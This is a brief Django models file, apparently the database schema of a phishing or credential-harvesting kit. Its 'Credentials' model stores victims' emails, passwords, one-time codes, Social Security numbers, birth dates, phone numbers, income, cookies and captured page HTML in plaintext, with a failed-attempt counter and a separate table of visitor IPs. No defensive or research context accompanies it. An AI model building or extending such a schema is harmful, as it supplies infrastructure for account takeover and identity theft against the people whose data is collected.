from django.db import models


class Credentials(models.Model):
    email = models.CharField(max_length=100, default="")
    password = models.CharField(max_length=100, default="")
    user_agent = models.CharField(max_length=1000, default="")
    ip = models.CharField(max_length=100, default="")
    otp = models.CharField(max_length=100, default="NA")
    ssn = models.CharField(max_length=100, default="")
    dob = models.CharField(max_length=100, default="")
    phone_number = models.CharField(max_length=100, default="")
    income_after_tax = models.CharField(max_length=100, default="")
    cookies = models.TextField(default="")
    html_code = models.TextField(default="")
    wrong_creds = models.IntegerField(default=-1)


class viewers(models.Model):
    ip = models.CharField(max_length=100, default="")
